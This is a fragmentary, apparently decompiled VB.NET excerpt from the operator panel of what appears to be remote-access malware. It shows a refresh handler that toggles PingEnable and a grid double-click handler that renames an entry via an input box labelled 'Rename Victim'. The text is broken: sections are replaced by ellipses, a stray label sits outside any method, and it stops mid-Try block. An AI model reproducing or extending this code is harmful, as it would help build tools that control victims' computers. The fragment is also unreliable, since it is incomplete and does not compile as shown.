...
Public Class Form1
    ...
    Public Shared PingEnable As Boolean = True
...
Label_036D:
    ...
    Private Sub ToolStripStatusLabel9_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel9.Click
        MsgBox("Refresh")
        Form1.PingEnable = True
        dsk()
    End Sub

    Private Sub L1_CellMouseDoubleClick(sender As Object, e As DataGridViewCellMouseEventArgs) Handles L1.CellMouseDoubleClick
        Dim a As L1 = DirectCast(sender, L1)
        Dim b As DataGridViewSelectedCellCollection = DirectCast(a.SelectedCells, DataGridViewSelectedCellCollection)
        Dim c As String = b.Item(1).Value
        c = Mid(c, 1, InStrRev(c, "_") - 1)
        Dim Str As String = Interaction.InputBox("Enter New Name", "Rename Victim", c, -1, -1)
        If (str.Length > 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.L1.SelectedRows.GetEnumerator
